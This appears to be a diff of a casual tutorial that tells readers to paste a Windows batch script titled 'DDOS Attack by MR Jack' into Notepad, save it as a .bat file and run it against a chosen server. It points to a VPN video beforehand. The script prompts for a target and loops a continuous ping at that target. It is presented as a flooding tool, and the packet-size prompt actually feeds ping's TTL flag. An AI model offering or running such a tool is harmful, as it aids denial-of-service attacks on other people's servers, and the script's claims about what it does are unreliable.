@@ -23,38 +23,69 @@ how to install a vpn here:https://youtu.be/te8KE71ndso
  1) Copy the folllowing code to youre Notepad:
  
 @echo off
+
 mode 67,16
+
 title DDOS Attack by MR Jack
+
 color 0a
+
 cls
+
 echo.
+
 echo ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+
 echo DDOS With Batchfile
+
 echo ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+
 echo.
+
+
 set /p x=Server-Target:
 echo.
+
 echo ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+
 ping %x%
+
 echo ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+
 @ping.exe 127.0.0.1 -n 5 -w 1000 > nul
-goto Next
+
+goto Next 
+
 :Next
+
 echo.
+
 echo.
+
 echo.
+
 set /p m=ip Host:
+
 echo.
+
 set /p n=Packet Size:
+
 echo.
+
 :DDOS
+
 color 0c
+
 echo Attacking Server %m%
+
 ping %m% -i %n% -t >nul
+
 goto DDOS
 
 2) its a batch file so save it as whateveruwant.bat
-3) enter the target server, the ip and how many packets u want to send to the Server
+3) 
+4) enter the target server, the ip and how many packets u want to send to the Server
+5) 
 Enjoy
 
 
